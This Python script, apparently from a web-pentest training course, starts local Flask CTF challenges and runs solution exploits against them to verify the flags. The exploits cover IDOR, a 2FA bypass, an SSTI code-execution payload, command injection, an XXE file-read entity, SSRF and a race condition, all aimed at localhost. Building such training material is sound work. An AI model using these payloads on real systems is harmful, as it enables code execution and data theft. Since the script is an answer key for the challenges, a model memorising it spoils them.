# -*- coding: utf-8 -*-
"""서버사이드 flask 문제를 실제로 띄워 원본 익스플로잇으로 flag 추출 검증."""
import os, sys, time, subprocess, socket, threading, urllib.parse
import requests

REPO = "/sessions/quirky-dazzling-planck/mnt/2026.06 교육센터 특강(금융기관 담당자)/web-pentest-edu"
FLAGS = {
    "FLAG_IDOR": "flag{idor_REAL}", "FLAG_2FA": "flag{2fa_REAL}",
    "FLAG_SSTI_1": "flag{ssti_REAL}", "FLAG_CMDI_1": "flag{cmdi_REAL}",
    "FLAG_XXE_1": "flag{xxe_REAL}", "FLAG_SSRF": "flag{ssrf_REAL}", "FLAG_RACE": "flag{race_REAL}",
}

def wait_port(port, t=12):
    for _ in range(int(t*10)):
        try:
            s = socket.create_connection(("127.0.0.1", port), 0.3); s.close(); return True
        except Exception:
            time.sleep(0.1)
    return False

def start(appfile, port, extra_env=None):
    env = dict(os.environ); env.update(FLAGS); env.update(extra_env or {})
    p = subprocess.Popen([sys.executable, appfile], env=env,
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    ok = wait_port(port)
    return p, ok

def run(name, path, port, exploit, env=None):
    appfile = os.path.join(REPO, path)
    p, ok = start(appfile, port, env)
    try:
        if not ok:
            print(f"  [{name:6s}] ✗ 서버 기동 실패"); return
        flag = exploit(port)
        want = FLAGS.get({"idor":"FLAG_IDOR","2fa":"FLAG_2FA","ssti":"FLAG_SSTI_1","cmdi":"FLAG_CMDI_1",
                          "xxe":"FLAG_XXE_1","ssrf":"FLAG_SSRF","race":"FLAG_RACE"}[name])
        ok2 = flag and want in flag
        print(f"  [{name:6s}] {'✓ PASS' if ok2 else '✗ FAIL'}  flag={ (flag or '').strip()[:60] }")
    finally:
        p.terminate()
        try: p.wait(3)
        except Exception: p.kill()

# ── exploits (원본 풀이) ──
def x_idor(port):
    s = requests.Session(); s.post(f"http://127.0.0.1:{port}/login", data={"u":"guest","p":"guest"})
    return s.get(f"http://127.0.0.1:{port}/balance?acct=1000").text

def x_2fa(port):
    s = requests.Session(); s.post(f"http://127.0.0.1:{port}/login", data={"u":"guest","p":"guest"})
    return s.get(f"http://127.0.0.1:{port}/secret").text

def x_ssti(port):
    # SSTI RCE 로 환경변수의 flag 추출
    pl = "{{cycler.__init__.__globals__.os.popen('echo $FLAG_SSTI_1').read()}}"
    return requests.get(f"http://127.0.0.1:{port}/", params={"name": pl}).text

def x_cmdi(port):
    # Blind → 파일 사이드이펙트로 유출
    proof = "/tmp/cmdi_proof.txt"
    if os.path.exists(proof): os.remove(proof)
    requests.get(f"http://127.0.0.1:{port}/", params={"cmd": f"echo $FLAG_CMDI_1 > {proof}"})
    time.sleep(0.3)
    return open(proof).read() if os.path.exists(proof) else ""

def x_xxe(port):
    open("/tmp/xxeflag.txt","w").write(FLAGS["FLAG_XXE_1"])
    body = ('<?xml version="1.0"?>\n<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///tmp/xxeflag.txt">]>'
            '\n<order><name>&xxe;</name></order>')
    return requests.post(f"http://127.0.0.1:{port}/order", data=body,
                         headers={"Content-Type":"application/xml"}).text

def x_ssrf(port):
    # 서버가 자기 자신(localhost)으로 요청 → 내부 전용 flag
    u = f"http://127.0.0.1:{port}/internal/flag"
    return requests.get(f"http://127.0.0.1:{port}/fetch", params={"url": u}).text

def x_race(port):
    base = f"http://127.0.0.1:{port}"
    requests.get(base+"/reset")
    def hit():
        try: requests.get(base+"/transfer", params={"amt":"100"}, timeout=5)
        except Exception: pass
    ts = [threading.Thread(target=hit) for _ in range(60)]
    [t.start() for t in ts]; [t.join() for t in ts]
    return requests.get(base+"/flag").text

print("=== 서버사이드 end-to-end 익스플로잇 검증 ===")
run("idor","challenges/auth/idor-balance/app.py",9301,x_idor)
run("2fa","challenges/auth/2fa-bypass/app.py",9302,x_2fa)
run("ssti","challenges/injection/ssti-1/app.py",9207,x_ssti)
run("cmdi","challenges/injection/cmdi-1/app.py",9206,x_cmdi)
run("xxe","challenges/injection/xxe-1/app.py",9208,x_xxe)
run("ssrf","challenges/server/ssrf-internal/app.py",9502,x_ssrf)
run("race","challenges/logic/race-transfer/app.py",9401,x_race)
